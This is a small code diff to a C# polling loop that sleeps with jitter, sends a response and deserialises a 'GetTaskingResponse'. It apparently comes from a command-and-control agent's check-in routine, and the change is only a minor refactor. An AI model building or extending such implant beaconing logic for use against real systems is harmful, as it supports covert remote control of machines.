@@ -114,14 +114,14 @@ namespace Agent.Profiles
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 try
                 {
-                    string responseString = await this.Send(await messageManager.GetAgentResponseStringAsync());
+                    string response = await messageManager.GetAgentResponseStringAsync();
+                    string responseString = await this.Send(response);
                     //Console.WriteLine(responseString);
                     if (String.IsNullOrEmpty(responseString))
                     {
                         this.currentAttempt++;
                         continue;
                     }
-
                     GetTaskingResponse gtr = JsonSerializer.Deserialize(responseString, GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                     if (gtr == null)
                     {
